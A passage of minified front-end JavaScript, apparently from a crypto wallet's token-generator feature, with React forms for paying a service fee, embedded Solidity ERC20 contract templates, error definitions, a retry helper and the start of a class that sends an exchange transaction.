                    ticker: m.currency,
                    family: m.currency,
                    smartContract: ""
                }].concat(xi(e) || [])
            }
            ))
              , k = useGoToReceivePage()
              , {Dialog: S, toggleDialog: C, updateDialogData: N} = useConfirmDeployDialog()
              , {formState: {errors: T}, handleSubmit: A, control: x, setValue: I, watch: P} = _;
            (0,
            O.useEffect)(( () => {
                E(Fu.fetchExchangeCurrencies())
            }
            ), []);
            const L = usePopup()
              , handleCreateWallet = async () => {
                if ("hbar" === (null == p ? void 0 : p.network)) {
                    L.open("import-or-create", {
                        initialTab: "import",
                        currency: "hbar"
                    });
                    return
                }
                const e = _e.ZP.getClass({
                    currency: null == p ? void 0 : p.network
                })
                  , t = await (new e).create({
                    currency: null == p ? void 0 : p.network
                });
                E(rd.addWallet({
                    wallet: t,
                    options: {
                        downloadType: Sm.AFTER_CREATE_WALLET
                    }
                }));
                y(!0);
                setTimeout(( () => y(!1)), 2e3);
                I("wallet", t)
            }
              , F = P("payWallet")
              , W = u.length > 0 && !u.some(w)
              , R = (null == F ? void 0 : F.currency) !== (null == m ? void 0 : m.currency) && u.length > 0
              , B = (0,
            O.useCallback)((e => {
                if (!e || !e.currency)
                    return 0;
                if ("ropsten" === e.currency || e.currency.endsWith("-testnet")) {
                    const t = {
                        ...e
                    };
                    t.currency = "ropsten" === e.currency ? "eth" : e.currency.split("-").shift();
                    return h(f, t, "usd")
                }
                return h(f, e, "usd")
            }
            ), [h, f])
              , D = (0,
            O.useCallback)((async e => {
                const {wallet: t, token: a, network: n} = e
                  , {data: r} = await TokenStateApi.findState({
                    address: t.address,
                    family: n,
                    ticker: a.symbol
                });
                return r.shift()
            }
            ), [])
              , M = (0,
            O.useCallback)((e => {
                const t = {
                    tokenInfo: null == e ? void 0 : e.token
                };
                N(t);
                C(!0)()
            }
            ), [N, C])
              , U = (0,
            O.useCallback)((async e => {
                const {payWallet: t, wallet: a} = e;
                let n = {
                    network: null == p ? void 0 : p.network,
                    serviceFee: B(t),
                    token: {
                        ...i,
                        type: null == p ? void 0 : p.type
                    }
                };
                n = R ? Object.assign(n, {
                    wallet: a,
                    exchange: {
                        fromWallet: t,
                        toWallet: a
                    }
                }) : Object.assign(n, {
                    wallet: t
                });
                E(Wre(n));
                const r = undefined;
                await D(n) || s.replace("/app/token-generator/process");
                M(n)
            }
            ), [E, B, s, R, i, null == p ? void 0 : p.network, null == p ? void 0 : p.type])
              , G = (0,
            O.useCallback)(( () => {
                C(!1)();
                s.replace({
                    pathname: "/app/token-generator/process"
                })
            }
            ), [C, s])
              , V = (0,
            O.useCallback)((async () => {
                C(!1)();
                await E(Wre(null));
                await E(setSecureData(je, null));
                s.replace({
                    pathname: "/app/token-generator/"
                })
            }
            ), [C, E, Wre, s]);
            return O.createElement("form", {
                onSubmit: A(U)
            }, O.createElement(S, {
                onConfirm: G,
                onCancel: V
            }), O.createElement("div", {
                className: "col-xs-6 col-xs-offset-1"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-10"
            }, O.createElement(label, null, "Choose a wallet to pay the service fee"), O.createElement(pa, {
                isSelect: !0,
                isInvalid: !!T.payWallet,
                message: null !== (t = T.payWallet) && void 0 !== t && t.balance ? null === (a = T.payWallet) || void 0 === a ? void 0 : a.balance.message : ""
            }, O.createElement(C$.Qr, {
                name: "payWallet",
                rules: {
                    required: !0,
                    validate: w
                },
                control: x,
                render: e => {
                    let {field: t} = e;
                    const a = t.value ? u.find((e => {
                        var a;
                        return e.uuid === (null === (a = t.value) || void 0 === a ? void 0 : a.uuid)
                    }
                    )) : void 0;
                    return O.createElement(Mh, form_extends({
                        getItem: WalletItem(w),
                        selectedWallet: a,
                        wallets: u,
                        withoutWatchOnly: !0,
                        withoutSubwallets: !0,
                        updateBalanceOnChange: !0,
                        isValidateOnChangeItem: w,
                        customFilter: e => onCustomFilterWallets(e, [""], {
                            exchangesCurrencies: b
                        }),
                        tokenGenPaymentCurrencies: !0
                    }, t))
                }
            })), W && O.createElement(O.Fragment, null, O.createElement("p", {
                className: Tle
            }, "Currently, you do not have enough funds to pay the service fee. You can top up your wallet on Guarda and proceed to the payment."), O.createElement("a", {
                className: _le,
                onClick: k(F)
            }, "Top up the wallet")), !W && R ? O.createElement("p", {
                className: Tle
            }, "Payments from non-", v, " wallets will cause a slight delay in contract deployment due to exchange process. We kindly remind you these delays may last up to 30 minutes") : O.createElement("p", {
                className: Tle
            }, "Your ", null == p ? void 0 : p.type, " tokens will be sent to ", v, " wallet. Later, you can manage them there"), F && O.createElement(O.Fragment, null, O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Service Fee:"), O.createElement(MiskInfoValue, {
                hightlight: !0
            }, null === (n = B(F)) || void 0 === n ? void 0 : n.toString(), " ", F.currency.toUpperCase())), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Equivalent:"), O.createElement(MiskInfoValue, {
                hightlight: !0
            }, f, " USD"))), !W && R && O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-10"
            }, O.createElement("br", null), O.createElement(label, null, "Choose your ", v, "-wallet"), O.createElement(pa, {
                isSelect: !0,
                isInvalid: !!T.wallet,
                message: null !== (r = T.wallet) && void 0 !== r && r.balance ? null === (l = T.wallet) || void 0 === l ? void 0 : l.balance.message : ""
            }, O.createElement(C$.Qr, {
                name: "wallet",
                control: x,
                rules: {
                    required: !0
                },
                render: e => {
                    let {field: t} = e;
                    const a = t.value ? d.find((e => {
                        var a;
                        return e.uuid === (null === (a = t.value) || void 0 === a ? void 0 : a.uuid)
                    }
                    )) : void 0;
                    return O.createElement(Mh, form_extends({
                        selectedWallet: a,
                        wallets: d,
                        withoutWatchOnly: !0,
                        withoutSubwallets: !0,
                        customFilter: e => onCustomFilterWallets(e, [a ? a.currency : ""])
                    }, t))
                }
            })), O.createElement("div", {
                onClick: handleCreateWallet,
                className: Lle
            }, "Create new ", v, "-wallet"), g && O.createElement(ui_message, {
                type: "info"
            }, "Wallet has been created"), O.createElement("p", {
                className: Tle
            }, "Your ", null == p ? void 0 : p.type, " tokens will be sent to ", v, " wallet. Later, you can manage them there")))))), O.createElement("div", {
                className: "col-xs-4"
            }, o), O.createElement("div", {
                className: "clearfix"
            }), O.createElement("div", {
                className: Ple
            }, O.createElement(Yl, {
                color: "blue",
                size: "large",
                type: "submit"
            }, "eth" === (null == p ? void 0 : p.network) ? "Deploy contract" : "Create token")), O.createElement(stepper, {
                step: 3
            }))
        }
          , Wle = form_Form
          , Rle = a.p + "1404a1cb3aea99addbb65ccd29c6d58d.svg"
          , Ble = a.p + "94d27ed55018636ec767a7da6ba249f8.svg"
          , Ole = a.p + "c10bb0a55bd00a3698e4cc6ee87ef9cd.svg"
          , PaymentPage = () => {
            const {tokenType: e, name: t, symbol: a} = useLocationSearch()
              , n = ere.getSupportedWallets(e)
              , r = ere.getServiceFee(e)
              , [l] = (0,
            O.useState)(( () => ere.getSupportedToken(e)))
              , s = (0,
            $.v9)($c)
              , i = (0,
            $.v9)(oe.Oj)
              , o = !!s.length
              , c = (0,
            $.v9)((e => Rre(e, [null == n ? void 0 : n.currency])))
              , u = (0,
            j.k6)()
              , d = (0,
            j.TH)()
              , m = (0,
            $.I0)()
              , [p,f] = (0,
            O.useState)([])
              , E = {
                payWallet: null == c ? void 0 : c[0],
                wallet: null == c ? void 0 : c[0]
            };
            (0,
            O.useEffect)(( () => {
                let e = !1;
                (async () => {
                    if (null == n || !n.currency)
                        return;
                    if (!o) {
                        const e = await m(restoreStorage(null));
                        await m(restoreWallets(null == e ? void 0 : e.wallets))
                    }
                    const t = await m(getSupportPaymentWallets({
                        currency: null == n ? void 0 : n.currency
                    }));
                    e || f(t)
                }
                )();
                return () => {
                    e = !0
                }
            }
            ), [m, i, d.search, null == n ? void 0 : n.currency, o, u]);
            return p ? O.createElement(lle, null, O.createElement("div", {
                className: "col-xs-12"
            }, O.createElement(BackButton, {
                to: `/app/token-generator/options?tokenType=${e}&name=${t}&symbol=${a}`,
                className: Ale
            }), O.createElement("div", {
                className: yle
            }, "Pay the service fee"), O.createElement("p", {
                className: vle
            }, "Token creation fee is ~", " ", O.createElement("b", null, r, " ", "USD"))), O.createElement(Wle, {
                defaultValues: E,
                targetWallets: c,
                exchangeWallets: p,
                supportWallet: n,
                tokenInfo: l,
                serviceFee: r
            }, l.network === PW.eth ? O.createElement("div", {
                className: Ile
            }, O.createElement("p", null, "We have made a smart contract for you to release an ERC20 token. The contract will be deployed as soon as you pay the service fee"), O.createElement("span", null, "Your smart-contract is: "), O.createElement("ul", null, O.createElement("li", null, O.createElement("img", {
                src: Rle,
                alt: ""
            }), "Audited & secure"), O.createElement("li", null, O.createElement("img", {
                src: Ble,
                alt: ""
            }), "Etherscan ready"), O.createElement("li", null, O.createElement("img", {
                src: Ole,
                alt: ""
            }), "Thought-out"))) : O.createElement("div", {
                className: Ile
            }, O.createElement("p", null, "The token will be deployed as soon as you pay the service fee")))) : null
        }
          , Dle = PaymentPage;
        var Mle = a(23828);
        const Ule = "\npragma solidity ^0.7.1;\n// SPDX-License-Identifier: MIT\n\n/**\n * @title SafeMath\n * @dev Math operations with safety checks that revert on error\n */\nlibrary SafeMath {\n\n  /**\n  * @dev Multiplies two numbers, reverts on overflow.\n  */\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n    // benefit is lost if 'b' is also tested.\n    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n    if (a == 0) {\n      return 0;\n    }\n\n    uint256 c = a * b;\n    require(c / a == b);\n\n    return c;\n  }\n\n  /**\n  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\n  */\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n    return c;\n  }\n\n  /**\n  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n  */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b <= a);\n    uint256 c = a - b;\n\n    return c;\n  }\n\n  /**\n  * @dev Adds two numbers, reverts on overflow.\n  */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    require(c >= a);\n\n    return c;\n  }\n\n  /**\n  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\n  * reverts when dividing by zero.\n  */\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b != 0);\n    return a % b;\n  }\n}\n\n/**\n * @title Roles\n * @dev Library for managing addresses assigned to a Role.\n */\nlibrary Roles {\n  struct Role {\n    mapping (address => bool) bearer;\n  }\n\n  /**\n   * @dev give an account access to this role\n   */\n  function add(Role storage role, address account) internal {\n    require(account != address(0));\n    require(!has(role, account));\n\n    role.bearer[account] = true;\n  }\n\n  /**\n   * @dev remove an account's access to this role\n   */\n  function remove(Role storage role, address account) internal {\n    require(account != address(0));\n    require(has(role, account));\n\n    role.bearer[account] = false;\n  }\n\n  /**\n   * @dev check if an account has this role\n   * @return bool\n   */\n  function has(Role storage role, address account)\n    internal\n    view\n    returns (bool)\n  {\n    require(account != address(0));\n    return role.bearer[account];\n  }\n}\n\n/**\n * @title ERC20 interface\n * @dev see https://github.com/ethereum/EIPs/issues/20\n */\n interface IERC20 {\n   function totalSupply() external view returns (uint256);\n\n   function balanceOf(address who) external view returns (uint256);\n\n   function allowance(address owner, address spender)\n     external view returns (uint256);\n\n   function transfer(address to, uint256 value) external returns (bool);\n\n   function approve(address spender, uint256 value)\n     external returns (bool);\n\n   function transferFrom(address from, address to, uint256 value)\n     external returns (bool);\n\n   event Transfer(\n     address indexed from,\n     address indexed to,\n     uint256 value\n   );\n\n   event Approval(\n     address indexed owner,\n     address indexed spender,\n     uint256 value\n   );\n }\n\ncontract ERC20 is IERC20 {\n  using SafeMath for uint256;\n  using Roles for Roles.Role;\n\n  event PauserAdded(address indexed account);\n  event PauserRemoved(address indexed account);\n  event Paused(address account);\n  event Unpaused(address account);\n\n  Roles.Role private pausers;\n\n  mapping (address => uint256) private _balances;\n\n  mapping (address => mapping (address => uint256)) private _allowed;\n\n  uint256 private _totalSupply;\n  string private _name;\n  string private _symbol;\n  uint8 private _decimals;\n  bool private _paused;\n\n  modifier onlyPauser() {\n    require(isPauser(msg.sender));\n    _;\n  }\n\n  constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply) {\n    _name = name;\n    _symbol = symbol;\n    _decimals = decimals;\n    _totalSupply = totalSupply;\n    _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);\n    _addPauser(msg.sender);\n    _paused = false;\n    emit Transfer(address(0), msg.sender, totalSupply);\n  }\n\n\n  /**\n   * @return true if the contract is paused, false otherwise.\n   */\n  function paused() public view returns(bool) {\n    return _paused;\n  }\n\n  /**\n   * @dev Modifier to make a function callable only when the contract is not paused.\n   */\n  modifier whenNotPaused() {\n    require(!_paused);\n    _;\n  }\n\n  /**\n   * @dev Modifier to make a function callable only when the contract is paused.\n   */\n  modifier whenPaused() {\n    require(_paused);\n    _;\n  }\n\n  /**\n   * @dev called by the owner to pause, triggers stopped state\n   */\n  function pause() public onlyPauser whenNotPaused {\n    _paused = true;\n    emit Paused(msg.sender);\n  }\n\n  /**\n   * @dev called by the owner to unpause, returns to normal state\n   */\n  function unpause() public onlyPauser whenPaused {\n    _paused = false;\n    emit Unpaused(msg.sender);\n  }\n\n  function isPauser(address account) public view returns (bool) {\n    return pausers.has(account);\n  }\n\n  function addPauser(address account) public onlyPauser {\n    _addPauser(account);\n  }\n\n  function renouncePauser() public {\n    _removePauser(msg.sender);\n  }\n\n  function _addPauser(address account) internal {\n    pausers.add(account);\n    emit PauserAdded(account);\n  }\n\n  function _removePauser(address account) internal {\n    pausers.remove(account);\n    emit PauserRemoved(account);\n  }\n\n  /**\n   * @return the name of the token.\n   */\n  function name() public view returns(string memory) {\n    return _name;\n  }\n\n  /**\n   * @return the symbol of the token.\n   */\n  function symbol() public view returns(string memory) {\n    return _symbol;\n  }\n\n  /**\n   * @return the number of decimals of the token.\n   */\n  function decimals() public view returns(uint8) {\n    return _decimals;\n  }\n\n  /**\n  * @dev Total number of tokens in existence\n  */\n  function totalSupply() public view override(IERC20) returns (uint256) {\n    return _totalSupply;\n  }\n\n  /**\n  * @dev Gets the balance of the specified address.\n  * @param owner The address to query the balance of.\n  * @return An uint256 representing the amount owned by the passed address.\n  */\n  function balanceOf(address owner) public view override(IERC20)  returns (uint256) {\n    return _balances[owner];\n  }\n\n  /**\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\n   * @param owner address The address which owns the funds.\n   * @param spender address The address which will spend the funds.\n   * @return A uint256 specifying the amount of tokens still available for the spender.\n   */\n  function allowance(\n    address owner,\n    address spender\n   )\n    public\n    view\n    override(IERC20) \n    returns (uint256)\n  {\n    return _allowed[owner][spender];\n  }\n\n  /**\n  * @dev Transfer token for a specified address\n  * @param to The address to transfer to.\n  * @param value The amount to be transferred.\n  */\n  function transfer(address to, uint256 value) public whenNotPaused override(IERC20)  returns (bool) {\n    _transfer(msg.sender, to, value);\n    return true;\n  }\n\n  /**\n   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\n   * Beware that changing an allowance with this method brings the risk that someone may use both the old\n   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\n   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n   * @param spender The address which will spend the funds.\n   * @param value The amount of tokens to be spent.\n   */\n  function approve(address spender, uint256 value) public whenNotPaused override(IERC20)  returns (bool) {\n    require(spender != address(0));\n\n    _allowed[msg.sender][spender] = value;\n    emit Approval(msg.sender, spender, value);\n    return true;\n  }\n\n  /**\n   * @dev Transfer tokens from one address to another\n   * @param from address The address which you want to send tokens from\n   * @param to address The address which you want to transfer to\n   * @param value uint256 the amount of tokens to be transferred\n   */\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  )\n    public\n    whenNotPaused\n    override(IERC20) \n    returns (bool)\n  {\n    require(value <= _allowed[from][msg.sender]);\n\n    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n    _transfer(from, to, value);\n    return true;\n  }\n\n  /**\n   * @dev Increase the amount of tokens that an owner allowed to a spender.\n   * approve should be called when allowed_[_spender] == 0. To increment\n   * allowed value is better to use this function to avoid 2 calls (and wait until\n   * the first transaction is mined)\n   * From MonolithDAO Token.sol\n   * @param spender The address which will spend the funds.\n   * @param addedValue The amount of tokens to increase the allowance by.\n   */\n  function increaseAllowance(\n    address spender,\n    uint256 addedValue\n  )\n    public\n    whenNotPaused\n    returns (bool)\n  {\n    require(spender != address(0));\n\n    _allowed[msg.sender][spender] = (\n      _allowed[msg.sender][spender].add(addedValue));\n    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n    return true;\n  }\n\n  /**\n   * @dev Decrease the amount of tokens that an owner allowed to a spender.\n   * approve should be called when allowed_[_spender] == 0. To decrement\n   * allowed value is better to use this function to avoid 2 calls (and wait until\n   * the first transaction is mined)\n   * From MonolithDAO Token.sol\n   * @param spender The address which will spend the funds.\n   * @param subtractedValue The amount of tokens to decrease the allowance by.\n   */\n  function decreaseAllowance(\n    address spender,\n    uint256 subtractedValue\n  )\n    public\n    whenNotPaused\n    returns (bool)\n  {\n    require(spender != address(0));\n\n    _allowed[msg.sender][spender] = (\n      _allowed[msg.sender][spender].sub(subtractedValue));\n    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n    return true;\n  }\n\n  /**\n  * @dev Transfer token for a specified addresses\n  * @param from The address to transfer from.\n  * @param to The address to transfer to.\n  * @param value The amount to be transferred.\n  */\n  function _transfer(address from, address to, uint256 value) internal {\n    require(value <= _balances[from]);\n    require(to != address(0));\n\n    _balances[from] = _balances[from].sub(value);\n    _balances[to] = _balances[to].add(value);\n    emit Transfer(from, to, value);\n  }\n}\n"
          , Gle = "\npragma solidity ^0.7.1;\n// SPDX-License-Identifier: MIT\n/**\n * @title SafeMath\n * @dev Math operations with safety checks that revert on error\n */\nlibrary SafeMath {\n\n  /**\n  * @dev Multiplies two numbers, reverts on overflow.\n  */\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n    // benefit is lost if 'b' is also tested.\n    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n    if (a == 0) {\n      return 0;\n    }\n\n    uint256 c = a * b;\n    require(c / a == b);\n\n    return c;\n  }\n\n  /**\n  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\n  */\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n    return c;\n  }\n\n  /**\n  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n  */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b <= a);\n    uint256 c = a - b;\n\n    return c;\n  }\n\n  /**\n  * @dev Adds two numbers, reverts on overflow.\n  */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    require(c >= a);\n\n    return c;\n  }\n\n  /**\n  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\n  * reverts when dividing by zero.\n  */\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n    require(b != 0);\n    return a % b;\n  }\n}\n\n/**\n * @title ERC20 interface\n * @dev see https://github.com/ethereum/EIPs/issues/20\n */\n interface IERC20 {\n   function totalSupply() external view returns (uint256);\n\n   function balanceOf(address who) external view returns (uint256);\n\n   function allowance(address owner, address spender)\n     external view returns (uint256);\n\n   function transfer(address to, uint256 value) external returns (bool);\n\n   function approve(address spender, uint256 value)\n     external returns (bool);\n\n   function transferFrom(address from, address to, uint256 value)\n     external returns (bool);\n\n   event Transfer(\n     address indexed from,\n     address indexed to,\n     uint256 value\n   );\n\n   event Approval(\n     address indexed owner,\n     address indexed spender,\n     uint256 value\n   );\n }\n\ncontract ERC20 is IERC20 {\n  using SafeMath for uint256;\n\n  mapping (address => uint256) private _balances;\n\n  mapping (address => mapping (address => uint256)) private _allowed;\n\n  uint256 private _totalSupply;\n  string private _name;\n  string private _symbol;\n  uint8 private _decimals;\n\n  constructor(string memory name, string memory symbol, uint8  decimals, uint256  totalSupply) {\n    _name = name;\n    _symbol = symbol;\n    _decimals = decimals;\n    _totalSupply = totalSupply;\n    _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);\n    emit Transfer(address(0), msg.sender, totalSupply);\n  }\n\n  /**\n   * @return the name of the token.\n   */\n  function name() public view returns(string memory) {\n    return _name;\n  }\n\n  /**\n   * @return the symbol of the token.\n   */\n  function symbol() public view returns(string memory) {\n    return _symbol;\n  }\n\n  /**\n   * @return the number of decimals of the token.\n   */\n  function decimals() public view returns(uint8) {\n    return _decimals;\n  }\n\n  /**\n  * @dev Total number of tokens in existence\n  */\n  function totalSupply() public view override(IERC20) returns (uint256) {\n    return _totalSupply;\n  }\n\n  /**\n  * @dev Gets the balance of the specified address.\n  * @param owner The address to query the balance of.\n  * @return An uint256 representing the amount owned by the passed address.\n  */\n  function balanceOf(address owner) public view override(IERC20) returns (uint256) {\n    return _balances[owner];\n  }\n\n  /**\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\n   * @param owner address The address which owns the funds.\n   * @param spender address The address which will spend the funds.\n   * @return A uint256 specifying the amount of tokens still available for the spender.\n   */\n  function allowance(\n    address owner,\n    address spender\n   )\n    public\n    view\n    override(IERC20)\n    returns (uint256)\n  {\n    return _allowed[owner][spender];\n  }\n\n  /**\n  * @dev Transfer token for a specified address\n  * @param to The address to transfer to.\n  * @param value The amount to be transferred.\n  */\n  function transfer(address to, uint256 value) public override(IERC20) returns (bool) {\n    _transfer(msg.sender, to, value);\n    return true;\n  }\n\n  /**\n   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\n   * Beware that changing an allowance with this method brings the risk that someone may use both the old\n   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\n   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n   * @param spender The address which will spend the funds.\n   * @param value The amount of tokens to be spent.\n   */\n  function approve(address spender, uint256 value) public override(IERC20) returns (bool) {\n    require(spender != address(0));\n\n    _allowed[msg.sender][spender] = value;\n    emit Approval(msg.sender, spender, value);\n    return true;\n  }\n\n  /**\n   * @dev Transfer tokens from one address to another\n   * @param from address The address which you want to send tokens from\n   * @param to address The address which you want to transfer to\n   * @param value uint256 the amount of tokens to be transferred\n   */\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  )\n    public\n    override(IERC20)\n    returns (bool)\n  {\n    require(value <= _allowed[from][msg.sender]);\n\n    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n    _transfer(from, to, value);\n    return true;\n  }\n\n  /**\n   * @dev Increase the amount of tokens that an owner allowed to a spender.\n   * approve should be called when allowed_[_spender] == 0. To increment\n   * allowed value is better to use this function to avoid 2 calls (and wait until\n   * the first transaction is mined)\n   * From MonolithDAO Token.sol\n   * @param spender The address which will spend the funds.\n   * @param addedValue The amount of tokens to increase the allowance by.\n   */\n  function increaseAllowance(\n    address spender,\n    uint256 addedValue\n  )\n    public\n    returns (bool)\n  {\n    require(spender != address(0));\n\n    _allowed[msg.sender][spender] = (\n      _allowed[msg.sender][spender].add(addedValue));\n    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n    return true;\n  }\n\n  /**\n   * @dev Decrease the amount of tokens that an owner allowed to a spender.\n   * approve should be called when allowed_[_spender] == 0. To decrement\n   * allowed value is better to use this function to avoid 2 calls (and wait until\n   * the first transaction is mined)\n   * From MonolithDAO Token.sol\n   * @param spender The address which will spend the funds.\n   * @param subtractedValue The amount of tokens to decrease the allowance by.\n   */\n  function decreaseAllowance(\n    address spender,\n    uint256 subtractedValue\n  )\n    public\n    returns (bool)\n  {\n    require(spender != address(0));\n\n    _allowed[msg.sender][spender] = (\n      _allowed[msg.sender][spender].sub(subtractedValue));\n    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n    return true;\n  }\n\n  /**\n  * @dev Transfer token for a specified addresses\n  * @param from The address to transfer from.\n  * @param to The address to transfer to.\n  * @param value The amount to be transferred.\n  */\n  function _transfer(address from, address to, uint256 value) internal {\n    require(value <= _balances[from]);\n    require(to != address(0));\n\n    _balances[from] = _balances[from].sub(value);\n    _balances[to] = _balances[to].add(value);\n    emit Transfer(from, to, value);\n  }\n}\n";
        let Vle, Kle;
        !function(e) {
            e.PRIVATE_KEY_NOT_DEFINED = "PRIVATE_KEY_NOT_DEFINED";
            e.ERROR_CREATING_TOKEN = "ERROR_CREATING_TOKEN";
            e.ERROR_PUBLISHING_CONTRACT = "ERROR_PUBLISHING_CONTRACT";
            e.ERROR_SENDING_SERVICE_FEE_TX = "ERROR_SENDING_SERVICE_FEE_TX";
            e.INSUFFICIENT_FUNDS = "INSUFFICIENT_FUNDS"
        }(Vle || (Vle = {}));
        !function(e) {
            e.TOKEN_IS_NOT_FOUND = "TOKEN_IS_NOT_FOUND";
            e.EXCHANGE_TX_IS_NOT_FINISHED = "EXCHANGE_TX_IS_NOT_FINISHED";
            e.TX_IS_NOT_CONFIRMED = "TX_IS_NOT_CONFIRMED"
        }(Kle || (Kle = {}));
        const enhanceError = (e, t, a, n) => {
            t && (e.code = t);
            e.request = a;
            e.response = n;
            e.isSkippedError = !0;
            e.toJSON = function toJSON() {
                return {
                    message: this.message,
                    name: this.name,
                    description: this.description,
                    number: this.number,
                    fileName: this.fileName,
                    lineNumber: this.lineNumber,
                    columnNumber: this.columnNumber,
                    stack: this.stack,
                    code: this.code
                }
            }
            ;
            return e
        }
          , isSkippedError = e => "object" == typeof e && null !== e && "isSkippedError"in e && (null == e ? void 0 : e.isSkippedError);
        function SkippedError(e, t, a, n) {
            const r = new Error(e);
            return enhanceError(r, t, a, n)
        }
        function TokenCreatorError(e, t, a, n) {
            const r = new Error(e)
              , l = enhanceError(r, t, a, n);
            l.isSkippedError = !1;
            return l
        }
        const Hle = {
            retries: 10,
            factor: 2,
            maxTimeout: 6e4,
            onFailedAttempt: M.CM ? e => {
                console.log("%c[token-generator]", "color: darkorange;", `Attempt ${e.attemptNumber} failed. There are ${e.retriesLeft} retries left.`, e.message)
            }
            : void 0
        };
        async function retry(e) {
            for (var t = arguments.length, a = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                a[n - 1] = arguments[n];
            const wrapper = async () => {
                try {
                    const t = undefined;
                    return await e(...a)
                } catch (e) {
                    if (Jf().isAxiosError(e) || isSkippedError(e))
                        throw e;
                    throw new (U9().AbortError)(e)
                }
            }
            ;
            return U9()(wrapper, Hle)
        }
        function abstract_token_generator_defineProperty(e, t, a) {
            (t = abstract_token_generator_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function abstract_token_generator_toPropertyKey(e) {
            var t = abstract_token_generator_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function abstract_token_generator_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class AbstractTokenGenerator {
            constructor(e, t) {
                abstract_token_generator_defineProperty(this, "network", void 0);
                abstract_token_generator_defineProperty(this, "serviceFee", void 0);
                abstract_token_generator_defineProperty(this, "exchange", void 0);
                abstract_token_generator_defineProperty(this, "token", void 0);
                abstract_token_generator_defineProperty(this, "wallet", void 0);
                abstract_token_generator_defineProperty(this, "smartContract", null);
                abstract_token_generator_defineProperty(this, "reduxActions", void 0);
                this.wallet = e.wallet;
                this.serviceFee = e.serviceFee;
                this.exchange = null == e ? void 0 : e.exchange;
                this.token = e.token;
                this.network = e.network;
                null != e && e.smartContract && (this.smartContract = e.smartContract);
                this.reduxActions = t
            }
            async sendExchangeTx() {
                if (!this.exchange)
                    throw Error("exchange wallets is undefined");
                const {serviceFee: e} = this
                  , {fromWallet: t, toWallet: a} = this.exchange
                  , n = await Se.Z.getApiByCurrency(null == t ? void 0 : t.currency)
                  , {fee: r} = await n.getFee({
                    addressFrom: t.address,
                    addressTo: t.address,
                    amount: t.balance
                })
                  , {currency: l} = Gl("changenow", t)
                  , {currency: s} = Gl("changenow", a)
                  , i = {
                    fromCurrency: l,
                    toCurrency: s,
                    fromNetwork: l,
                    toNetwork: s,
                    fromAmount: (0,
                    Ko.h9)(e, r).toString(),
                    partner: "changenow",
                    addressFrom: t.address,
                    address: a.address,
                    label: "app"
                }
                  , o = this.reduxActions.createExchangeTransaction(i);
                if (!o || !o.payinAddress) {
                    var c;
                    throw new Error(null !== (c = o.errObj) && void 0 !== c ? c : "Failed to create exchange transaction")
                }
                const {id: u, payinExtraId: d=null, payinAddress: m} = o
                  , {address: p, privateKey: f} = t
                  , {hash: E} = await n.sendTransaction({
                    privateKey: f,
                    addressFrom: p,
                    addressTo: m,
                    extraId: d,
                    amount: this.serviceFee,
                    isFeeIncluded: !0,
                    fee: r
                });
                return {
                    hash: E,
                    transactionId: u
                }
            }
